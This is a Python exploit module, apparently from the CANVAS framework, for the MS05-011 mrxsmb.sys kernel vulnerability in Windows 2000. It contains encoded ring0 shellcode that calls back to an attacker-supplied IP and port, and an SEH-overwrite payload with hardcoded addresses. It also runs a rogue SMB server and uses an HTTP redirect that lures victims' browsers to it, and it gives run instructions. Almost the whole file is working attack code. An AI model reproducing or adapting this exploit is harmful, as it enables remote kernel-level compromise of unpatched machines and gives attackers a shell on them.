#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import struct

#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket

import canvasengine
from exploitutils import *
from httpclientside import httpclientside
import greenapple

NAME="GREENAPPLE (MS05-011)"
DESCRIPTION="GREENAPPLE mrxsmb.sys remote ring0 exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Pre-exploitation"]="Requires CANVAS to be run as root/administrator"
DOCUMENTATION["CVE Name"] = "CVE-2005-0045"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0045"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["MSRC"] = "http://www.microsoft.com/technet/security/Bulletin/MS05-011.mspx"
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['MSADV'] = "MS05-011"
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""

runas:
    sudo exploits/httpserver/httpserver.py -v 1 -O singleexploit:gapple_client -l 192.168.10.80 -d 8080
    
This exploit currently works against Windows 2000 SP4 BASE.

This needs to be run as root from a Linux box because it becomes the SMB layer. You'll want to turn off Samba as well.

You can check Control Panel->Add/Remove Programs->Windows 2000 Hotfix - KB885250
if installed the vuln is patched.

"""

CHANGELOG="""


"""


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        
        self.shellcode="\xcc"
        self.setVersions()
        self.version=1
        self.badstring=""
        self.name=NAME 
        self.filename="test.html"
        self.listenerArgsDict["fromcreatethread"]=1
        return

    def allfunc(self, a):
        return 1
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows 2000 SP4", None)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        
        r0code =\
               "\xe8\xff\xff\xff\xff"+\
               "\xc3\x5e\x33\xc9\xb1"+\
               "\x24\x03\xf1\x33\xc9"+\
               "\x66\xb9\x5f\x02\xbf"+\
               "\x04\x08\xdf\xff\x51"+\
               "\x57\x57\xf3\xa4\x5b"+\
               "\x5f\x59\x80\x37\xba"+\
               "\x47\x49\x75\xf9\xff"+\
               "\xe3\xd0\x82\xe1\xde"+\
               "\x31\xb9\x31\xfa\xbe"+\
               "\xdc\x9f\xbb\x4a\xf2"+\
               "\xdc\x3b\x82\xf7\xe0"+\
               "\xcf\x4e\x31\x52\xdc"+\
               "\x01\x2d\x16\x52\x65"+\
               "\xbb\xba\xba\x37\xed"+\
               "\xbe\xe8\xd0\xb2\x45"+\
               "\x6a\x31\xfd\xbe\x89"+\
               "\x73\x0b\x1a\xb9\x7b"+\
               "\x89\x73\xdc\x03\xe6"+\
               "\xbb\x31\xba\x3b\x86"+\
               "\xbb\xf6\xe9\xfb\xe9"+\
               "\xce\xb3\x3b\x86\xbb"+\
               "\xd6\xc9\xdb\xc9\xcf"+\
               "\x56\x37\x3a\xda\x45"+\
               "\x45\x45\xea\xea\xdc"+\
               "\x01\xd2\x0d\x52\x19"+\
               "\xbb\xba\xba\x45\x6a"+\
               "\xd0\xbe\x7d\xfd\xaa"+\
               "\xb8\xba\xba\xba\x37"+\
               "\xe5\xaa\xe9\xd0\x98"+\
               "\xd2\x45\xba\xba\xba"+\
               "\xdc\x01\x98\x14\x52"+\
               "\x3e\xbb\xba\xba\x45"+\
               "\x6a\xdc\x01\xde\x0d"+\
               "\x52\xc3\xbb\xba\xba"+\
               "\x45\x6a\xe2\x31\x32"+\
               "\xca\xb8\xba\xba\x31"+\
               "\xb3\x3a\x03\xa0\x45"+\
               "\x45\x45\xbb\xcf\x4f"+\
               "\x37\x33\x7a\x47\x45"+\
               "\x45\x33\xf5\xae\xdc"+\
               "\x01\x0c\x0c\x52\xe9"+\
               "\xbb\xba\xba\xd2\xba"+\
               "\xaa\xba\xba\xd0\xba"+\
               "\x45\x6a\x33\xfd\xaa"+\
               "\xdc\x01\x64\x0c\x52"+\
               "\x84\xbb\xba\xba\xf2"+\
               "\xfa\x3a\x82\x79\xcf"+\
               "\x40\xea\xe4\xdc\x01"+\
               "\x1c\x0d\x52\x96\xbb"+\
               "\xba\xba\x89\x68\xe8"+\
               "\xd0\xbb\x01\xbe\xb2"+\
               "\x44\xc5\x37\x21\x89"+\
               "\xbb\xba\xba\xe9\xe8"+\
               "\xec\xe8\x31\xf5\xae"+\
               "\xeb\x31\xe5\xaa\xe9"+\
               "\x45\x6a\xdc\x01\xf2"+\
               "\x0c\x52\xbf\xbb\xba"+\
               "\xba\x89\x68\xe8\xe8"+\
               "\xe8\x31\xe5\xaa\xe9"+\
               "\x45\x6a\xdc\x01\xb5"+\
               "\x11\x52\x4b\xba\xba"+\
               "\xba\x89\x68\x33\xed"+\
               "\xb2\x7d\xfd\xb6\xba"+\
               "\xba\xba\x3a\x37\xe5"+\
               "\xb2\xe9\xd0\xba\xd0"+\
               "\xba\x45\x6a\xdc\x01"+\
               "\x64\x0c\x52\x68\xba"+\
               "\xba\xba\xea\xe1\x45"+\
               "\x69\x51\x46\x2a\x2a"+\
               "\x2a\x2a\x52\x45\x45"+\
               "\x45\x45\x79\xe4\xd0"+\
               "\x8a\xe3\xde\x31\xbb"+\
               "\x31\xfa\xb6\x31\xca"+\
               "\xa6\x17\x31\xd2\xb2"+\
               "\xdc\x01\x52\x0a\x52"+\
               "\x12\xba\xba\xba\xd0"+\
               "\xfa\xd2\xba\xaa\xba"+\
               "\xba\xd2\xba\x9a\xba"+\
               "\xba\xd0\xba\x45\x6a"+\
               "\x2c\xdc\x01\xfe\x09"+\
               "\x52\x34\xba\xba\xba"+\
               "\xd2\x89\x88\xba\xba"+\
               "\xd2\xed\xe9\x88\xe5"+\
               "\x37\xa6\x9e\xe9\x45"+\
               "\x6a\xef\x31\x52\xdc"+\
               "\x01\x1a\x08\x52\xc8"+\
               "\xba\xba\xba\xd0\xba"+\
               "\xd0\xba\x37\xa6\x9e"+\
               "\xe9\xd0\xb8\x45\x6a"+\
               "\xe1\xe1\xdc\x01\xbb"+\
               "\x05\x52\xe1\xba\xba"+\
               "\xba\xd0\xba\xd0\xbb"+\
               "\xd0\xb8\x45\x6a\x2d"+\
               "\xdc\x01\x94\x06\x52"+\
               "\xf3\xba\xba\xba\xd2"+\
               "IPADDR" + "\xd2"+\
               "\xb8\xba" + "PORT" +"\x31"+\
               "\x66\xd0\xaa\xe9\xed"+\
               "\x45\x6a\xe1\xe1\x3f"+\
               "\x7a\xc6\x98\xdc\x01"+\
               "\xd8\x02\x52\x92\xba"+\
               "\xba\xba\xea\xd0\xba"+\
               "\xd0\xbe\xec\xed\x45"+\
               "\x6a\xe2\xd0\xba\xd2"+\
               "\x45\xa5\xba\xba\xec"+\
               "\xed\x45\x6a\xed\xed"+\
               "\x45\x5c\xe7\xdc\x01"+\
               "\x5a\x08\x52\xbf\xba"+\
               "\xba\xba\x89\x73\xeb"+\
               "\x45\x6a\xda\xb5\x0d"+\
               "\xcf\x86\x31\xce\x8f"+\
               "\xc2\x37\xc6\x8f\xba"+\
               "\xed\x31\xc5\x9a\x37"+\
               "\xc6\x87\xba\x89\x73"+\
               "\x31\x8e\x35\x37\xce"+\
               "\x8f\xba\x89\x7a\x23"+\
               "\x16\x3e\x7a\xce\xb2"+\
               "\xbe\xb1\x8e\x33\xb9"+\
               "\x6a\x51\x49\x3b\x48"+\
               "\x04\x00\xba\xba\xfb"+\
               "\xdc\x81\x69\xcf\x67"+\
               "\xf3\x89\x68\xe5\x31"+\
               "\xcd\x9e\x37\xce\x8f"+\
               "\xba\xdc\x31\xae\xf4"+\
               "\x7b\x58\xb8\x31\xfd"+\
               "\xa6\x37\xfe\xbf\xba"+\
               "\x31\xbe\xb8\x37\xfe"+\
               "\xbf\xba\x33\xfe\x9e"+\
               "\xa6\xdb\x79"

        tmp = ""
        
        #self.log("callback: %s:%d" % (host, int(port)))
        for each in socket.inet_aton(host):
            l = ord(each) ^ 0xba
            tmp += chr(l)
        r0code = r0code.replace("IPADDR", tmp)
        
        l = int(port) ^ 0xbaba
        r0code = r0code.replace("PORT", struct.pack(">H", l))
        return r0code
        
    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1

    def makefile(self):
        """not needed, we can redirect to NamedPipe from webserver"""
        text = "<html>\r\n<li><a href=\"\\\\%s\\NamedPipe\\foo\">foo</a></li>\r\n</html>\r\n"
        text = text % self.callback.ip
        return text
        
    def gapple_find_first2(self, header, body):
        #WIN2K, SEH overwrite
        #ExecuteHandler+0x24: 8046a04f
        geteip=0x800f4928L
        geteip=0x8040270bL
        #handler addr: jmp edi 0xff 0xe7 points to next dword, jmp ebx to prior
        self.log("GGGGGGGGGGGGGGGGGGGGGGRRRRRRRRRRRRRRRRRRRREEEEEEEEEEEEEEEEEEEEEEEEEEEENNNNNNNNNNNNNNNNNNNNNNNNN!")
        params="\x00"*108 + struct.pack("<L", 0xbabebabeL) + struct.pack("<L", 0xbeefbeefL) + "\xcc"*0x90 +\
               struct.pack("<L", 0xbabebabeL) + struct.pack("<L", geteip) +\
               self.createShellcode()        

        #XP, eip smash
        #params="\x00"*104 + struct.pack("<L", 0xbabebabeL) + struct.pack("<L", 0x80500a8bL) + "\xcc"*600

        return "",params,"hello max!"

    def setupSMBServer(self):

        self.log("Starting smb server")
        mysmbserver= greenapple.SMBServer("0.0.0.0", 445)

        mysmbserver.target = ""

        mysmbserver.trans2_response_functions[1] = self.gapple_find_first2
 
        if mysmbserver.listen()==0:
            print "Could not listen!"
            return
        
        self.smblock.acquire()
        self.smbinit = 1
        self.smblock.release()

        print "Accepting"

        mysmbserver.accept()
        
        while mysmbserver.handle():
            if self.ISucceeded():
                print "Done."
                break
            print "Handled."
        
        return

    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """

        import threading
        import time
        self.smblock = threading.Lock()
        self.smbinit = 0
        self.SMBthr = threading.Thread(target=self.setupSMBServer)
        self.SMBthr.start()
        time.sleep(1)

        self.smblock.acquire()
        if self.smbinit != 1:
            raise Exception, "Could not listen on port 445. You should be running as administrator/root"
        self.smblock.release()
        
        
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        #redirect to smbserver
        self.log("redirecting to smbserver")
        h.status="302"
        h.addHeader("Location","\\\\%s\\NamedPipe\\foo" % self.callback.ip)
        h.addHeader("Content-Type","foo/moo")

        return h, b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
